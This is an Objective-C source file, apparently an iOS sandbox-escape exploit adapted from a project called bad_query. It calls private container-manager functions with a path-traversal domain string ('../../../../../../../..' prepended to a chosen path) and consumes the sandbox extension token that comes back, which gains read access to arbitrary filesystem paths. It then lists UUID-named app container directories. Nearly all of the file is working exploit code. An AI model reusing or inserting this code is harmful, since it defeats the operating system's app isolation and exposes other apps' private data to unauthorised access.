// SPDX-License-Identifier: GPL-3.0-only
// Application-container path access adapted from forcequitOS/bad_query.
#import "bad_query.h"
#include <dlfcn.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <xpc/xpc.h>

typedef void *(*cq_create)(void);
typedef void (*cq_class)(void *, uint64_t);
typedef void (*cq_ids)(void *, xpc_object_t);
typedef void (*cq_flags)(void *, uint64_t);
typedef void (*cq_part)(void *, uint64_t);
typedef void (*cq_domain)(void *, const char *);
typedef void *(*cq_result)(void *);
typedef void (*cq_free)(void *);
typedef char *(*cq_token)(void *);
typedef int64_t (*consume_fn)(const char *);
typedef int (*release_fn)(int64_t);

int64_t bad_query(const char *path, bool create) {
    if (!path || path[0] != '/') return -255;
    if (!create) { struct stat st; if (lstat(path, &st) != 0) return -254; }
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -1;
    cq_create createQuery = dlsym(mgr, "container_query_create");
    cq_class setClass = dlsym(mgr, "container_query_set_class");
    cq_ids setIDs = dlsym(mgr, "container_query_set_group_identifiers");
    cq_flags setFlags = dlsym(mgr, "container_query_operation_set_flags");
    cq_part setPart = dlsym(mgr, "container_query_operation_set_part");
    cq_domain setDomain = dlsym(mgr, "container_query_operation_set_part_domain");
    cq_result getResult = dlsym(mgr, "container_query_get_single_result");
    cq_free freeQuery = dlsym(mgr, "container_query_free");
    cq_token copyToken = dlsym(mgr, "container_copy_sandbox_token");
    consume_fn consume = dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!createQuery || !setClass || !setIDs || !setFlags || !setPart || !setDomain || !getResult || !freeQuery || !copyToken || !consume) { dlclose(mgr); return -1; }
    void *query = createQuery();
    if (!query) { dlclose(mgr); return -2; }
    xpc_object_t identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    setClass(query, 13);
    setIDs(query, identifier);
    setPart(query, 3);
    char *domain = NULL;
    if (asprintf(&domain, "../../../../../../../..%s", path) == -1) { xpc_release(identifier); freeQuery(query); dlclose(mgr); return -5; }
    setDomain(query, domain);
    setFlags(query, 0x0000008000000000ULL);
    void *result = getResult(query);
    int64_t handle = -3;
    if (result) {
        char *token = copyToken(result);
        if (token) { handle = consume(token); free(token); }
    }
    free(domain); xpc_release(identifier); freeQuery(query); dlclose(mgr);
    return handle;
}

void bad_query_release(int64_t handle) {
    if (handle < 0) return;
    release_fn release = dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release) release(handle);
}

NSArray<NSString *> *bad_query_list_children(NSString *path, int64_t *status) {
    int64_t handle = bad_query(path.fileSystemRepresentation, false);
    if (status) *status = handle;
    if (handle < 0) return nil;
    NSError *error = nil;
    NSArray *names = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:path error:&error];
    bad_query_release(handle);
    if (!names) return nil;
    NSMutableArray *paths = [NSMutableArray array];
    for (NSString *name in names) {
        NSString *child = [path stringByAppendingPathComponent:name];
        if ([[NSUUID alloc] initWithUUIDString:child.lastPathComponent]) [paths addObject:child];
    }
    if (status) *status = paths.count;
    return paths;
}
